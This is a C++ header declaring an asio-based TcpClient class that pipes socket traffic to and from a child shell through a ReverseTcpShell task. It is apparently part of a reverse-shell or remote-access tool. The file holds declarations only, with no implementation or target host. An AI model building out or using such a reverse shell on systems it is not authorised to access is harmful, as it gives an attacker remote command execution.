#ifndef TCP_CLIENT_H
#define TCP_CLIENT_H

#include <Common.h>

#include <ReverseTcpShell.h>

#include <thread>
#include <memory>

class TcpClient : public std::enable_shared_from_this<TcpClient>
{
public:
    typedef std::shared_ptr<TcpClient> Pointer;

    ~TcpClient();

    void Start();

    asio::ip::tcp::socket &GetSocket();

    static Pointer Create(asio::io_context &ioContext);

private:
    typedef std::array<char, 8192>  Buffer;

    static const asio::chrono::milliseconds CHILD_WATCH_TIMER_DURATION;

    TcpClient(asio::io_context &ioContext);

    void Cancel();
    
    void WriteToSocket(const std::string &message);
    void ReadFromSocket();

    void OnWriteToSocket(const asio::error_code &error, const size_t nBytesTransferred);
    void OnReadFromSocket(const asio::error_code &error, const size_t nBytesTransferred);

    void WriteToShell(const std::string &message);
    void ReadFromShell();

    void OnWriteToShell(const asio::error_code &error, const size_t nBytesTransferred);
    void OnReadFromShell(const asio::error_code &error, const size_t nBytesTransferred);

    void CheckShellAlive(const asio::error_code &error);

    asio::io_context                        &m_ioContext;
    asio::ip::tcp::socket                   m_socket;
    asio::steady_timer                      m_childWatchTimer;
    asio::streambuf                         m_socketInputBuffer;
    // asio::streambuf                         m_shellInputBuffer;
    Buffer                                  m_shellInputBuffer;

    std::unique_ptr<Task::ReverseTcpShell>  m_pReverseTcpShellTask;
};

#endif // TCP_CLIENT_H
